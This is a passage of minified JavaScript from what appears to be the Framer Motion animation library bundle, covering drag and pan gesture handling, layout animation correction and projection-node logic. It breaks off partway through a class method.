const tw = ({ current: e }) => e ? e.ownerDocument.defaultView : null
  , fA = new WeakMap;
class hA {
  constructor(t) {
    this.openDragLock = null,
      this.isDragging = !1,
      this.currentDirection = null,
      this.originPoint = {
        x: 0,
        y: 0
      },
      this.constraints = !1,
      this.hasMutatedConstraints = !1,
      this.elastic = Ae(),
      this.visualElement = t
  }
  start(t, { snapToCursor: n = !1 } = {}) {
    const { presenceContext: r } = this.visualElement;
    if (r && r.isPresent === !1)
      return;
    const s = d => {
      const { dragSnapToOrigin: f } = this.getProps();
      f ? this.pauseAnimation() : this.stopAnimation(),
        n && this.snapToCursor(zi(d).point)
    }
      , o = (d, f) => {
        const { drag: h, dragPropagation: y, onDragStart: b } = this.getProps();
        if (h && !y && (this.openDragLock && this.openDragLock(),
          this.openDragLock = W4(h),
          !this.openDragLock))
          return;
        this.isDragging = !0,
          this.currentDirection = null,
          this.resolveConstraints(),
          this.visualElement.projection && (this.visualElement.projection.isAnimationBlocked = !0,
            this.visualElement.projection.target = void 0),
          Mt(C => {
            let g = this.getAxisMotionValue(C).get() || 0;
            if (pn.test(g)) {
              const { projection: m } = this.visualElement;
              if (m && m.layout) {
                const p = m.layout.layoutBox[C];
                p && (g = jt(p) * (parseFloat(g) / 100))
              }
            }
            this.originPoint[C] = g
          }
          ),
          b && de.postRender(() => b(d, f)),
          Od(this.visualElement, "transform");
        const { animationState: v } = this.visualElement;
        v && v.setActive("whileDrag", !0)
      }
      , i = (d, f) => {
        const { dragPropagation: h, dragDirectionLock: y, onDirectionLock: b, onDrag: v } = this.getProps();
        if (!h && !this.openDragLock)
          return;
        const { offset: C } = f;
        if (y && this.currentDirection === null) {
          this.currentDirection = mA(C),
            this.currentDirection !== null && b && b(this.currentDirection);
          return
        }
        this.updateAxis("x", f.point, C),
          this.updateAxis("y", f.point, C),
          this.visualElement.render(),
          v && v(d, f)
      }
      , l = (d, f) => this.stop(d, f)
      , c = () => Mt(d => {
        var f;
        return this.getAnimationState(d) === "paused" && ((f = this.getAxisMotionValue(d).animation) === null || f === void 0 ? void 0 : f.play())
      }
      )
      , { dragSnapToOrigin: u } = this.getProps();
    this.panSession = new q1(t, {
      onSessionStart: s,
      onStart: o,
      onMove: i,
      onSessionEnd: l,
      resumeAnimation: c
    }, {
      transformPagePoint: this.visualElement.getTransformPagePoint(),
      dragSnapToOrigin: u,
      contextWindow: tw(this.visualElement)
    })
  }
  stop(t, n) {
    const r = this.isDragging;
    if (this.cancel(),
      !r)
      return;
    const { velocity: s } = n;
    this.startAnimation(s);
    const { onDragEnd: o } = this.getProps();
    o && de.postRender(() => o(t, n))
  }
  cancel() {
    this.isDragging = !1;
    const { projection: t, animationState: n } = this.visualElement;
    t && (t.isAnimationBlocked = !1),
      this.panSession && this.panSession.end(),
      this.panSession = void 0;
    const { dragPropagation: r } = this.getProps();
    !r && this.openDragLock && (this.openDragLock(),
      this.openDragLock = null),
      n && n.setActive("whileDrag", !1)
  }
  updateAxis(t, n, r) {
    const { drag: s } = this.getProps();
    if (!r || !wa(t, s, this.currentDirection))
      return;
    const o = this.getAxisMotionValue(t);
    let i = this.originPoint[t] + r[t];
    this.constraints && this.constraints[t] && (i = nA(i, this.constraints[t], this.elastic[t])),
      o.set(i)
  }
  resolveConstraints() {
    var t;
    const { dragConstraints: n, dragElastic: r } = this.getProps()
      , s = this.visualElement.projection && !this.visualElement.projection.layout ? this.visualElement.projection.measure(!1) : (t = this.visualElement.projection) === null || t === void 0 ? void 0 : t.layout
      , o = this.constraints;
    n && Ns(n) ? this.constraints || (this.constraints = this.resolveRefConstraints()) : n && s ? this.constraints = rA(s.layoutBox, n) : this.constraints = !1,
      this.elastic = aA(r),
      o !== this.constraints && s && this.constraints && !this.hasMutatedConstraints && Mt(i => {
        this.constraints !== !1 && this.getAxisMotionValue(i) && (this.constraints[i] = iA(s.layoutBox[i], this.constraints[i]))
      }
      )
  }
  resolveRefConstraints() {
    const { dragConstraints: t, onMeasureDragConstraints: n } = this.getProps();
    if (!t || !Ns(t))
      return !1;
    const r = t.current
      , { projection: s } = this.visualElement;
    if (!s || !s.layout)
      return !1;
    const o = dA(r, s.root, this.visualElement.getTransformPagePoint());
    let i = sA(s.layout.layoutBox, o);
    if (n) {
      const l = n(lA(i));
      this.hasMutatedConstraints = !!l,
        l && (i = X1(l))
    }
    return i
  }
  startAnimation(t) {
    const { drag: n, dragMomentum: r, dragElastic: s, dragTransition: o, dragSnapToOrigin: i, onDragTransitionEnd: l } = this.getProps()
      , c = this.constraints || {}
      , u = Mt(d => {
        if (!wa(d, n, this.currentDirection))
          return;
        let f = c && c[d] || {};
        i && (f = {
          min: 0,
          max: 0
        });
        const h = s ? 200 : 1e6
          , y = s ? 40 : 1e7
          , b = {
            type: "inertia",
            velocity: r ? t[d] : 0,
            bounceStiffness: h,
            bounceDamping: y,
            timeConstant: 750,
            restDelta: 1,
            restSpeed: 10,
            ...o,
            ...f
          };
        return this.startAxisValueAnimation(d, b)
      }
      );
    return Promise.all(u).then(l)
  }
  startAxisValueAnimation(t, n) {
    const r = this.getAxisMotionValue(t);
    return Od(this.visualElement, t),
      r.start(yh(t, r, 0, n, this.visualElement, !1))
  }
  stopAnimation() {
    Mt(t => this.getAxisMotionValue(t).stop())
  }
  pauseAnimation() {
    Mt(t => {
      var n;
      return (n = this.getAxisMotionValue(t).animation) === null || n === void 0 ? void 0 : n.pause()
    }
    )
  }
  getAnimationState(t) {
    var n;
    return (n = this.getAxisMotionValue(t).animation) === null || n === void 0 ? void 0 : n.state
  }
  getAxisMotionValue(t) {
    const n = `_drag${t.toUpperCase()}`
      , r = this.visualElement.getProps()
      , s = r[n];
    return s || this.visualElement.getValue(t, (r.initial ? r.initial[t] : void 0) || 0)
  }
  snapToCursor(t) {
    Mt(n => {
      const { drag: r } = this.getProps();
      if (!wa(n, r, this.currentDirection))
        return;
      const { projection: s } = this.visualElement
        , o = this.getAxisMotionValue(n);
      if (s && s.layout) {
        const { min: i, max: l } = s.layout.layoutBox[n];
        o.set(t[n] - we(i, l, .5))
      }
    }
    )
  }
  scalePositionWithinConstraints() {
    if (!this.visualElement.current)
      return;
    const { drag: t, dragConstraints: n } = this.getProps()
      , { projection: r } = this.visualElement;
    if (!Ns(n) || !r || !this.constraints)
      return;
    this.stopAnimation();
    const s = {
      x: 0,
      y: 0
    };
    Mt(i => {
      const l = this.getAxisMotionValue(i);
      if (l && this.constraints !== !1) {
        const c = l.get();
        s[i] = oA({
          min: c,
          max: c
        }, this.constraints[i])
      }
    }
    );
    const { transformTemplate: o } = this.visualElement.getProps();
    this.visualElement.current.style.transform = o ? o({}, "") : "none",
      r.root && r.root.updateScroll(),
      r.updateLayout(),
      this.resolveConstraints(),
      Mt(i => {
        if (!wa(i, t, null))
          return;
        const l = this.getAxisMotionValue(i)
          , { min: c, max: u } = this.constraints[i];
        l.set(we(c, u, s[i]))
      }
      )
  }
  addListeners() {
    if (!this.visualElement.current)
      return;
    fA.set(this.visualElement, this);
    const t = this.visualElement.current
      , n = wr(t, "pointerdown", c => {
        const { drag: u, dragListener: d = !0 } = this.getProps();
        u && d && this.start(c)
      }
      )
      , r = () => {
        const { dragConstraints: c } = this.getProps();
        Ns(c) && c.current && (this.constraints = this.resolveRefConstraints())
      }
      , { projection: s } = this.visualElement
      , o = s.addEventListener("measure", r);
    s && !s.layout && (s.root && s.root.updateScroll(),
      s.updateLayout()),
      de.read(r);
    const i = kn(window, "resize", () => this.scalePositionWithinConstraints())
      , l = s.addEventListener("didUpdate", ({ delta: c, hasLayoutChanged: u }) => {
        this.isDragging && u && (Mt(d => {
          const f = this.getAxisMotionValue(d);
          f && (this.originPoint[d] += c[d].translate,
            f.set(f.get() + c[d].translate))
        }
        ),
          this.visualElement.render())
      }
      );
    return () => {
      i(),
        n(),
        o(),
        l && l()
    }
  }
  getProps() {
    const t = this.visualElement.getProps()
      , { drag: n = !1, dragDirectionLock: r = !1, dragPropagation: s = !1, dragConstraints: o = !1, dragElastic: i = _d, dragMomentum: l = !0 } = t;
    return {
      ...t,
      drag: n,
      dragDirectionLock: r,
      dragPropagation: s,
      dragConstraints: o,
      dragElastic: i,
      dragMomentum: l
    }
  }
}
function wa(e, t, n) {
  return (t === !0 || t === e) && (n === null || n === e)
}
function mA(e, t = 10) {
  let n = null;
  return Math.abs(e.y) > t ? n = "y" : Math.abs(e.x) > t && (n = "x"),
    n
}
class pA extends Tr {
  constructor(t) {
    super(t),
      this.removeGroupControls = Je,
      this.removeListeners = Je,
      this.controls = new hA(t)
  }
  mount() {
    const { dragControls: t } = this.node.getProps();
    t && (this.removeGroupControls = t.subscribe(this.controls)),
      this.removeListeners = this.controls.addListeners() || Je
  }
  unmount() {
    this.removeGroupControls(),
      this.removeListeners()
  }
}
const hg = e => (t, n) => {
  e && de.postRender(() => e(t, n))
}
  ;
class gA extends Tr {
  constructor() {
    super(...arguments),
      this.removePointerDownListener = Je
  }
  onPointerDown(t) {
    this.session = new q1(t, this.createPanHandlers(), {
      transformPagePoint: this.node.getTransformPagePoint(),
      contextWindow: tw(this.node)
    })
  }
  createPanHandlers() {
    const { onPanSessionStart: t, onPanStart: n, onPan: r, onPanEnd: s } = this.node.getProps();
    return {
      onSessionStart: hg(t),
      onStart: hg(n),
      onMove: r,
      onEnd: (o, i) => {
        delete this.session,
          s && de.postRender(() => s(o, i))
      }
    }
  }
  mount() {
    this.removePointerDownListener = wr(this.node.current, "pointerdown", t => this.onPointerDown(t))
  }
  update() {
    this.session && this.session.updateHandlers(this.createPanHandlers())
  }
  unmount() {
    this.removePointerDownListener(),
      this.session && this.session.end()
  }
}
const oc = x.createContext(null);
function yA() {
  const e = x.useContext(oc);
  if (e === null)
    return [!0, null];
  const { isPresent: t, onExitComplete: n, register: r } = e
    , s = x.useId();
  x.useEffect(() => r(s), []);
  const o = x.useCallback(() => n && n(s), [s, n]);
  return !t && n ? [!1, o] : [!0]
}
const Sh = x.createContext({})
  , nw = x.createContext({})
  , Va = {
    hasAnimatedSinceResize: !0,
    hasEverUpdated: !1
  };
function mg(e, t) {
  return t.max === t.min ? 0 : e / (t.max - t.min) * 100
}
const Do = {
  correct: (e, t) => {
    if (!t.target)
      return e;
    if (typeof e == "string")
      if (Y.test(e))
        e = parseFloat(e);
      else
        return e;
    const n = mg(e, t.target.x)
      , r = mg(e, t.target.y);
    return `${n}% ${r}%`
  }
}
  , vA = {
    correct: (e, { treeScale: t, projectionDelta: n }) => {
      const r = e
        , s = Nr.parse(e);
      if (s.length > 5)
        return r;
      const o = Nr.createTransformer(e)
        , i = typeof s[0] != "number" ? 1 : 0
        , l = n.x.scale * t.x
        , c = n.y.scale * t.y;
      s[0 + i] /= l,
        s[1 + i] /= c;
      const u = we(l, c, .5);
      return typeof s[2 + i] == "number" && (s[2 + i] /= u),
        typeof s[3 + i] == "number" && (s[3 + i] /= u),
        o(s)
    }
  }
  , Cl = {};
function xA(e) {
  Object.assign(Cl, e)
}
const { schedule: Ch, cancel: k5 } = s1(queueMicrotask, !1);
class wA extends x.Component {
  componentDidMount() {
    const { visualElement: t, layoutGroup: n, switchLayoutGroup: r, layoutId: s } = this.props
      , { projection: o } = t;
    xA(bA),
      o && (n.group && n.group.add(o),
        r && r.register && s && r.register(o),
        o.root.didUpdate(),
        o.addEventListener("animationComplete", () => {
          this.safeToRemove()
        }
        ),
        o.setOptions({
          ...o.options,
          onExitComplete: () => this.safeToRemove()
        })),
      Va.hasEverUpdated = !0
  }
  getSnapshotBeforeUpdate(t) {
    const { layoutDependency: n, visualElement: r, drag: s, isPresent: o } = this.props
      , i = r.projection;
    return i && (i.isPresent = o,
      s || t.layoutDependency !== n || n === void 0 ? i.willUpdate() : this.safeToRemove(),
      t.isPresent !== o && (o ? i.promote() : i.relegate() || de.postRender(() => {
        const l = i.getStack();
        (!l || !l.members.length) && this.safeToRemove()
      }
      ))),
      null
  }
  componentDidUpdate() {
    const { projection: t } = this.props.visualElement;
    t && (t.root.didUpdate(),
      Ch.postRender(() => {
        !t.currentAnimation && t.isLead() && this.safeToRemove()
      }
      ))
  }
  componentWillUnmount() {
    const { visualElement: t, layoutGroup: n, switchLayoutGroup: r } = this.props
      , { projection: s } = t;
    s && (s.scheduleCheckAfterUnmount(),
      n && n.group && n.group.remove(s),
      r && r.deregister && r.deregister(s))
  }
  safeToRemove() {
    const { safeToRemove: t } = this.props;
    t && t()
  }
  render() {
    return null
  }
}
function rw(e) {
  const [t, n] = yA()
    , r = x.useContext(Sh);
  return a.jsx(wA, {
    ...e,
    layoutGroup: r,
    switchLayoutGroup: x.useContext(nw),
    isPresent: t,
    safeToRemove: n
  })
}
const bA = {
  borderRadius: {
    ...Do,
    applyTo: ["borderTopLeftRadius", "borderTopRightRadius", "borderBottomLeftRadius", "borderBottomRightRadius"]
  },
  borderTopLeftRadius: Do,
  borderTopRightRadius: Do,
  borderBottomLeftRadius: Do,
  borderBottomRightRadius: Do,
  boxShadow: vA
}
  , sw = ["TopLeft", "TopRight", "BottomLeft", "BottomRight"]
  , SA = sw.length
  , pg = e => typeof e == "string" ? parseFloat(e) : e
  , gg = e => typeof e == "number" || Y.test(e);
function CA(e, t, n, r, s, o) {
  s ? (e.opacity = we(0, n.opacity !== void 0 ? n.opacity : 1, NA(r)),
    e.opacityExit = we(t.opacity !== void 0 ? t.opacity : 1, 0, jA(r))) : o && (e.opacity = we(t.opacity !== void 0 ? t.opacity : 1, n.opacity !== void 0 ? n.opacity : 1, r));
  for (let i = 0; i < SA; i++) {
    const l = `border${sw[i]}Radius`;
    let c = yg(t, l)
      , u = yg(n, l);
    if (c === void 0 && u === void 0)
      continue;
    c || (c = 0),
      u || (u = 0),
      c === 0 || u === 0 || gg(c) === gg(u) ? (e[l] = Math.max(we(pg(c), pg(u), r), 0),
        (pn.test(u) || pn.test(c)) && (e[l] += "%")) : e[l] = u
  }
  (t.rotate || n.rotate) && (e.rotate = we(t.rotate || 0, n.rotate || 0, r))
}
function yg(e, t) {
  return e[t] !== void 0 ? e[t] : e.borderRadius
}
const NA = ow(0, .5, d1)
  , jA = ow(.5, .95, Je);
function ow(e, t, n) {
  return r => r < e ? 0 : r > t ? 1 : n(so(e, t, r))
}
function vg(e, t) {
  e.min = t.min,
    e.max = t.max
}
function kt(e, t) {
  vg(e.x, t.x),
    vg(e.y, t.y)
}
function xg(e, t) {
  e.translate = t.translate,
    e.scale = t.scale,
    e.originPoint = t.originPoint,
    e.origin = t.origin
}
function wg(e, t, n, r, s) {
  return e -= t,
    e = Sl(e, 1 / n, r),
    s !== void 0 && (e = Sl(e, 1 / s, r)),
    e
}
function PA(e, t = 0, n = 1, r = .5, s, o = e, i = e) {
  if (pn.test(t) && (t = parseFloat(t),
    t = we(i.min, i.max, t / 100) - i.min),
    typeof t != "number")
    return;
  let l = we(o.min, o.max, r);
  e === o && (l -= t),
    e.min = wg(e.min, t, n, l, s),
    e.max = wg(e.max, t, n, l, s)
}
function bg(e, t, [n, r, s], o, i) {
  PA(e, t[n], t[r], t[s], t.scale, o, i)
}
const AA = ["x", "scaleX", "originX"]
  , EA = ["y", "scaleY", "originY"];
function Sg(e, t, n, r) {
  bg(e.x, t, AA, n ? n.x : void 0, r ? r.x : void 0),
    bg(e.y, t, EA, n ? n.y : void 0, r ? r.y : void 0)
}
function Cg(e) {
  return e.translate === 0 && e.scale === 1
}
function iw(e) {
  return Cg(e.x) && Cg(e.y)
}
function Ng(e, t) {
  return e.min === t.min && e.max === t.max
}
function TA(e, t) {
  return Ng(e.x, t.x) && Ng(e.y, t.y)
}
function jg(e, t) {
  return Math.round(e.min) === Math.round(t.min) && Math.round(e.max) === Math.round(t.max)
}
function aw(e, t) {
  return jg(e.x, t.x) && jg(e.y, t.y)
}
function Pg(e) {
  return jt(e.x) / jt(e.y)
}
function Ag(e, t) {
  return e.translate === t.translate && e.scale === t.scale && e.originPoint === t.originPoint
}
class kA {
  constructor() {
    this.members = []
  }
  add(t) {
    vh(this.members, t),
      t.scheduleRender()
  }
  remove(t) {
    if (xh(this.members, t),
      t === this.prevLead && (this.prevLead = void 0),
      t === this.lead) {
      const n = this.members[this.members.length - 1];
      n && this.promote(n)
    }
  }
  relegate(t) {
    const n = this.members.findIndex(s => t === s);
    if (n === 0)
      return !1;
    let r;
    for (let s = n; s >= 0; s--) {
      const o = this.members[s];
      if (o.isPresent !== !1) {
        r = o;
        break
      }
    }
    return r ? (this.promote(r),
      !0) : !1
  }
  promote(t, n) {
    const r = this.lead;
    if (t !== r && (this.prevLead = r,
      this.lead = t,
      t.show(),
      r)) {
      r.instance && r.scheduleRender(),
        t.scheduleRender(),
        t.resumeFrom = r,
        n && (t.resumeFrom.preserveOpacity = !0),
        r.snapshot && (t.snapshot = r.snapshot,
          t.snapshot.latestValues = r.animationValues || r.latestValues),
        t.root && t.root.isUpdating && (t.isLayoutDirty = !0);
      const { crossfade: s } = t.options;
      s === !1 && r.hide()
    }
  }
  exitAnimationComplete() {
    this.members.forEach(t => {
      const { options: n, resumingFrom: r } = t;
      n.onExitComplete && n.onExitComplete(),
        r && r.options.onExitComplete && r.options.onExitComplete()
    }
    )
  }
  scheduleRender() {
    this.members.forEach(t => {
      t.instance && t.scheduleRender(!1)
    }
    )
  }
  removeLeadSnapshot() {
    this.lead && this.lead.snapshot && (this.lead.snapshot = void 0)
  }
}
function DA(e, t, n) {
  let r = "";
  const s = e.x.translate / t.x
    , o = e.y.translate / t.y
    , i = (n == null ? void 0 : n.z) || 0;
  if ((s || o || i) && (r = `translate3d(${s}px, ${o}px, ${i}px) `),
    (t.x !== 1 || t.y !== 1) && (r += `scale(${1 / t.x}, ${1 / t.y}) `),
    n) {
    const { transformPerspective: u, rotate: d, rotateX: f, rotateY: h, skewX: y, skewY: b } = n;
    u && (r = `perspective(${u}px) ${r}`),
      d && (r += `rotate(${d}deg) `),
      f && (r += `rotateX(${f}deg) `),
      h && (r += `rotateY(${h}deg) `),
      y && (r += `skewX(${y}deg) `),
      b && (r += `skewY(${b}deg) `)
  }
  const l = e.x.scale * t.x
    , c = e.y.scale * t.y;
  return (l !== 1 || c !== 1) && (r += `scale(${l}, ${c})`),
    r || "none"
}
const MA = (e, t) => e.depth - t.depth;
class RA {
  constructor() {
    this.children = [],
      this.isDirty = !1
  }
  add(t) {
    vh(this.children, t),
      this.isDirty = !0
  }
  remove(t) {
    xh(this.children, t),
      this.isDirty = !0
  }
  forEach(t) {
    this.isDirty && this.children.sort(MA),
      this.isDirty = !1,
      this.children.forEach(t)
  }
}
function Ba(e) {
  const t = Xe(e) ? e.get() : e;
  return b4(t) ? t.toValue() : t
}
function OA(e, t) {
  const n = gn.now()
    , r = ({ timestamp: s }) => {
      const o = s - n;
      o >= t && (Cr(r),
        e(o - t))
    }
    ;
  return de.read(r, !0),
    () => Cr(r)
}
function IA(e) {
  return e instanceof SVGElement && e.tagName !== "svg"
}
function _A(e, t, n) {
  const r = Xe(e) ? e : Pi(e);
  return r.start(yh("", r, t, n)),
    r.animation
}
const Or = {
  type: "projectionFrame",
  totalNodes: 0,
  resolvedTargetDeltas: 0,
  recalculatedProjection: 0
}
  , Fo = typeof window < "u" && window.MotionDebug !== void 0
  , mu = ["", "X", "Y", "Z"]
  , LA = {
    visibility: "hidden"
  }
  , Eg = 1e3;
let FA = 0;
function pu(e, t, n, r) {
  const { latestValues: s } = t;
  s[e] && (n[e] = s[e],
    t.setStaticValue(e, 0),
    r && (r[e] = 0))
}
function lw(e) {
  if (e.hasCheckedOptimisedAppear = !0,
    e.root === e)
    return;
  const { visualElement: t } = e.options;
  if (!t)
    return;
  const n = U1(t);
  if (window.MotionHasOptimisedAnimation(n, "transform")) {
    const { layout: s, layoutId: o } = e.options;
    window.MotionCancelOptimisedAnimation(n, "transform", de, !(s || o))
  }
  const { parent: r } = e;
  r && !r.hasCheckedOptimisedAppear && lw(r)
}
function cw({ attachResizeListener: e, defaultParent: t, measureScroll: n, checkIsScrollRoot: r, resetTransform: s }) {
  return class {
    constructor(i = {}, l = t == null ? void 0 : t()) {
      this.id = FA++,
        this.animationId = 0,
        this.children = new Set,
        this.options = {},
        this.isTreeAnimating = !1,
        this.isAnimationBlocked = !1,
        this.isLayoutDirty = !1,
        this.isProjectionDirty = !1,
        this.isSharedProjectionDirty = !1,
        this.isTransformDirty = !1,
        this.updateManuallyBlocked = !1,
        this.updateBlockedByResize = !1,
        this.isUpdating = !1,
        this.isSVG = !1,
        this.needsReset = !1,
        this.shouldResetTransform = !1,
        this.hasCheckedOptimisedAppear = !1,
        this.treeScale = {
          x: 1,
          y: 1
        },
        this.eventHandlers = new Map,
        this.hasTreeAnimated = !1,
        this.updateScheduled = !1,
        this.scheduleUpdate = () => this.update(),
        this.projectionUpdateScheduled = !1,
        this.checkUpdateFailed = () => {
          this.isUpdating && (this.isUpdating = !1,
            this.clearAllSnapshots())
        }
        ,
        this.updateProjection = () => {
          this.projectionUpdateScheduled = !1,
            Fo && (Or.totalNodes = Or.resolvedTargetDeltas = Or.recalculatedProjection = 0),
            this.nodes.forEach(zA),
            this.nodes.forEach(QA),
            this.nodes.forEach(qA),
            this.nodes.forEach(UA),
            Fo && window.MotionDebug.record(Or)
        }
        ,
        this.resolvedRelativeTargetAt = 0,
        this.hasProjected = !1,
        this.isVisible = !0,
        this.animationProgress = 0,
        this.sharedNodes = new Map,
        this.latestValues = i,
        this.root = l ? l.root || l : this,
        this.path = l ? [...l.path, l] : [],
        this.parent = l,
        this.depth = l ? l.depth + 1 : 0;
      for (let c = 0; c < this.path.length; c++)
        this.path[c].shouldResetTransform = !0;
      this.root === this && (this.nodes = new RA)
    }
    addEventListener(i, l) {
      return this.eventHandlers.has(i) || this.eventHandlers.set(i, new wh),
        this.eventHandlers.get(i).add(l)
    }
    notifyListeners(i, ...l) {
      const c = this.eventHandlers.get(i);
      c && c.notify(...l)
    }
    hasListeners(i) {
      return this.eventHandlers.has(i)
    }
    mount(i, l = this.root.hasTreeAnimated) {
      if (this.instance)
        return;
      this.isSVG = IA(i),
        this.instance = i;
      const { layoutId: c, layout: u, visualElement: d } = this.options;
      if (d && !d.current && d.mount(i),
        this.root.nodes.add(this),
        this.parent && this.parent.children.add(this),
        l && (u || c) && (this.isLayoutDirty = !0),
        e) {
        let f;
        const h = () => this.root.updateBlockedByResize = !1;
        e(i, () => {
          this.root.updateBlockedByResize = !0,
            f && f(),
            f = OA(h, 250),
            Va.hasAnimatedSinceResize && (Va.hasAnimatedSinceResize = !1,
              this.nodes.forEach(kg))
        }
        )
      }
      c && this.root.registerSharedNode(c, this),
        this.options.animate !== !1 && d && (c || u) && this.addEventListener("didUpdate", ({ delta: f, hasLayoutChanged: h, hasRelativeTargetChanged: y, layout: b }) => {
          if (this.isTreeAnimationBlocked()) {
            this.target = void 0,
              this.relativeTarget = void 0;
            return
          }
          const v = this.options.transition || d.getDefaultTransition() || JA
            , { onLayoutAnimationStart: C, onLayoutAnimationComplete: g } = d.getProps()
            , m = !this.targetLayout || !aw(this.targetLayout, b) || y
            , p = !h && y;
          if (this.options.layoutRoot || this.resumeFrom && this.resumeFrom.instance || p || h && (m || !this.currentAnimation)) {
            this.resumeFrom && (this.resumingFrom = this.resumeFrom,
              this.resumingFrom.resumingFrom = void 0),
              this.setAnimationOrigin(f, p);
            const w = {
              ...rh(v, "layout"),
              onPlay: C,
              onComplete: g
            };
            (d.shouldReduceMotion || this.options.layoutRoot) && (w.delay = 0,
              w.type = !1),
              this.startAnimation(w)
          } else
            h || kg(this),
              this.isLead() && this.options.onExitComplete && this.options.onExitComplete();
          this.targetLayout = b
        }
        )
    }
    unmount() {
      this.options.layoutId && this.willUpdate(),
        this.root.nodes.remove(this);
      const i = this.getStack();
      i && i.remove(this),
        this.parent && this.parent.children.delete(this),
        this.instance = void 0,
        Cr(this.updateProjection)
    }
    blockUpdate() {
      this.updateManuallyBlocked = !0
    }
    unblockUpdate() {
      this.updateManuallyBlocked = !1
    }
    isUpdateBlocked() {
      return this.updateManuallyBlocked || this.updateBlockedByResize
    }
    isTreeAnimationBlocked() {
      return this.isAnimationBlocked || this.parent && this.parent.isTreeAnimationBlocked() || !1
    }
    startUpdate() {
      this.isUpdateBlocked() || (this.isUpdating = !0,
        this.nodes && this.nodes.forEach(GA),
        this.animationId++)
    }
    getTransformTemplate() {
      const { visualElement: i } = this.options;
      return i && i.getProps().transformTemplate
    }
    willUpdate(i = !0) {
      if (this.root.hasTreeAnimated = !0,
        this.root.isUpdateBlocked()) {
        this.options.onExitComplete && this.options.onExitComplete();
        return
      }
      if (window.MotionCancelOptimisedAnimation && !this.hasCheckedOptimisedAppear && lw(this),
        !this.root.isUpdating && this.root.startUpdate(),
        this.isLayoutDirty)
        return;
      this.isLayoutDirty = !0;
      for (let d = 0; d < this.path.length; d++) {
        const f = this.path[d];
        f.shouldResetTransform = !0,
          f.updateScroll("snapshot"),
          f.options.layoutRoot && f.willUpdate(!1)
      }
      const { layoutId: l, layout: c } = this.options;
      if (l === void 0 && !c)
        return;
      const u = this.getTransformTemplate();
      this.prevTransformTemplateValue = u ? u(this.latestValues, "") : void 0,
        this.updateSnapshot(),
        i && this.notifyListeners("willUpdate")
    }
    update() {
      if (this.updateScheduled = !1,
        this.isUpdateBlocked()) {
        this.unblockUpdate(),
          this.clearAllSnapshots(),
          this.nodes.forEach(Tg);
        return
      }
      this.isUpdating || this.nodes.forEach(HA),
        this.isUpdating = !1,
        this.nodes.forEach(WA),
        this.nodes.forEach(VA),
        this.nodes.forEach(BA),
        this.clearAllSnapshots();
      const l = gn.now();
      Be.delta = Bn(0, 1e3 / 60, l - Be.timestamp),
        Be.timestamp = l,
        Be.isProcessing = !0,
        iu.update.process(Be),
        iu.preRender.process(Be),
        iu.render.process(Be),
        Be.isProcessing = !1
    }
    didUpdate() {
      this.updateScheduled || (this.updateScheduled = !0,
        Ch.read(this.scheduleUpdate))
    }
    clearAllSnapshots() {
      this.nodes.forEach($A),
        this.sharedNodes.forEach(KA)
    }
    scheduleUpdateProjection() {
      this.projectionUpdateScheduled || (this.projectionUpdateScheduled = !0,
        de.preRender(this.updateProjection, !1, !0))
    }
    scheduleCheckAfterUnmount() {
      de.postRender(() => {
        this.isLayoutDirty ? this.root.didUpdate() : this.root.checkUpdateFailed()
      }
      )
    }
    updateSnapshot() {
      this.snapshot || !this.instance || (this.snapshot = this.measure())
    }
    updateLayout() {
      if (!this.instance || (this.updateScroll(),
        !(this.options.alwaysMeasureLayout && this.isLead()) && !this.isLayoutDirty))
        return;
      if (this.resumeFrom && !this.resumeFrom.instance)
        for (let c = 0; c < this.path.length; c++)
          this.path[c].updateScroll();
      const i = this.layout;
      this.layout = this.measure(!1),
        this.layoutCorrected = Ae(),
        this.isLayoutDirty = !1,
        this.projectionDelta = void 0,
        this.notifyListeners("measure", this.layout.layoutBox);
      const { visualElement: l } = this.options;
      l && l.notify("LayoutMeasure", this.layout.layoutBox, i ? i.layoutBox : void 0)
    }
    updateScroll(i = "measure") {
      let l = !!(this.options.layoutScroll && this.instance);
      if (this.scroll && this.scroll.animationId === this.root.animationId && this.scroll.phase === i && (l = !1),
        l) {
        const c = r(this.instance);
        this.scroll = {
          animationId: this.root.animationId,
          phase: i,
          isRoot: c,
          offset: n(this.instance),
          wasRoot: this.scroll ? this.scroll.isRoot : c
        }
      }
    }
    resetTransform() {
      if (!s)
        return;
      const i = this.isLayoutDirty || this.shouldResetTransform || this.options.alwaysMeasureLayout
        , l = this.projectionDelta && !iw(this.projectionDelta)
        , c = this.getTransformTemplate()
        , u = c ? c(this.latestValues, "") : void 0
        , d = u !== this.prevTransformTemplateValue;
      i && (l || Rr(this.latestValues) || d) && (s(this.instance, u),
        this.shouldResetTransform = !1,
        this.scheduleRender())
    }
    measure(i = !0) {
      const l = this.measurePageBox();
      let c = this.removeElementScroll(l);
      return i && (c = this.removeTransform(c)),
        ZA(c),
      {
        animationId: this.root.animationId,
        measuredBox: l,
        layoutBox: c,
        latestValues: {},
        source: this.id
      }
    }
    measurePageBox() {
      var i;
      const { visualElement: l } = this.options;
      if (!l)
        return Ae();
      const c = l.measureViewportBox();
      if (!(((i = this.scroll) === null || i === void 0 ? void 0 : i.wasRoot) || this.path.some(eE))) {
        const { scroll: d } = this.root;
        d && (Ps(c.x, d.offset.x),
          Ps(c.y, d.offset.y))
      }
      return c
    }
    removeElementScroll(i) {
      var l;
      const c = Ae();
      if (kt(c, i),
        !((l = this.scroll) === null || l === void 0) && l.wasRoot)
        return c;
      for (let u = 0; u < this.path.length; u++) {
        const d = this.path[u]
          , { scroll: f, options: h } = d;
        d !== this.root && f && h.layoutScroll && (f.wasRoot && kt(c, i),
          Ps(c.x, f.offset.x),
          Ps(c.y, f.offset.y))
      }
      return c
    }
    applyTransform(i, l = !1) {
      const c = Ae();
      kt(c, i);
      for (let u = 0; u < this.path.length; u++) {
        const d = this.path[u];
        !l && d.options.layoutScroll && d.scroll && d !== d.root && As(c, {
          x: -d.scroll.offset.x,
          y: -d.scroll.offset.y
        }),
          Rr(d.latestValues) && As(c, d.latestValues)
      }
      return Rr(this.latestValues) && As(c, this.latestValues),
        c
    }
    removeTransform(i) {
      const l = Ae();
      kt(l, i);
      for (let c = 0; c < this.path.length; c++) {
        const u = this.path[c];
        if (!u.instance || !Rr(u.latestValues))
          continue;
        Ld(u.latestValues) && u.updateSnapshot();
        const d = Ae()
          , f = u.measurePageBox();
        kt(d, f),
          Sg(l, u.latestValues, u.snapshot ? u.snapshot.layoutBox : void 0, d)
      }
      return Rr(this.latestValues) && Sg(l, this.latestValues),
        l
    }
    setTargetDelta(i) {
      this.targetDelta = i,
        this.root.scheduleUpdateProjection(),
        this.isProjectionDirty = !0
    }
    setOptions(i) {
